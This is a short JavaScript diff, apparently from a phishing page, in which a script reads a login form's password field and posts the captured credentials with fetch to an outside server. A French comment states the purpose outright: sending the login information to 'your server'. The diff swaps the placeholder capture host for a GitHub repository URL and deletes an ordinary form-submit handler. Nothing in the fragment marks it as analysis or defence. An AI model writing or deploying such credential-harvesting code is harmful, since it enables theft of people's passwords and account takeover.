@@ -23,7 +23,7 @@ document.addEventListener('DOMContentLoaded', function () {
         var password = document.querySelector('#Tab2 #password').value;
 
         // Envoyer les informations de connexion à votre serveur
-        fetch('https://votre-serveur.com/capture', {
+        fetch('https://github.com/Creator-Marl/Dark-Genesis', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
@@ -43,21 +43,4 @@ document.addEventListener('DOMContentLoaded', function () {
 
 });
 
-document.querySelectorAll('form').forEach(form => {
-  form.addEventListener('submit', function(event) {
-    event.preventDefault();
-    const formData = new FormData(form);
-    fetch('/submit', {
-      method: 'POST',
-      body: formData
-    })
-    .then(response => response.json())
-    .then(data => {
-      alert('Form submitted successfully!');
-    })
-    .catch(error => {
-      console.error('Error:', error);
-    });
-  });
-});
 
